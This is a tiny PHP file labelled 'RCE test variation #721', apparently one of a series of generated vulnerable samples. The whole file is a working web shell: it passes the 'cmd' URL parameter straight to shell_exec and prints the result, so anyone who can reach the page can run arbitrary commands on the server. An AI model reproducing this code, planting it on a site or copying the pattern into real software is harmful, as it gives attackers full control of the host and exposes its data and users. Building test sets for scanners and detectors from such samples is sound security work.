<?php
// RCE test variation #721
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>